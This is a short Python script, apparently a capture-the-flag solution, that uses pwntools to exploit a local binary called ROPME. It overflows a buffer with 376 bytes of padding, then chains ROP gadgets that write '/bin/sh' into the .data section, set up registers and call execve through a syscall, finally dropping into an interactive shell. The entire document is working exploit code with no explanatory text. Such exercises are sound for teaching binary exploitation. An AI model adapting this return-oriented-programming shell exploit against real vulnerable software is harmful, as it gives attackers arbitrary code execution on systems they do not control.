#!/usr/bin/python3
from pwn import *

shell = process("./ROPME")

offset = 376
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4019c1)  # pop rdi; ret;
payload += p64(0x4af000)  # .data
payload += p64(0x40889e)  # pop rsi; ret;
payload += b"/bin/sh\x00" # string to write
payload += p64(0x443bbf)  # mov qword ptr [rdi], rsi; ret;
payload += p64(0x40889e)  # pop rsi; ret;
payload += p64(0x0)       # NULL
payload += p64(0x40170f)  # pop rdx; ret;
payload += p64(0x0)       # NULL
payload += p64(0x447437)  # pop rax; ret;
payload += p64(0x3b)      # execve()
payload += p64(0x415a34)  # syscall; ret;

shell.sendlineafter(b":\n", payload)
shell.recvline()
shell.interactive()
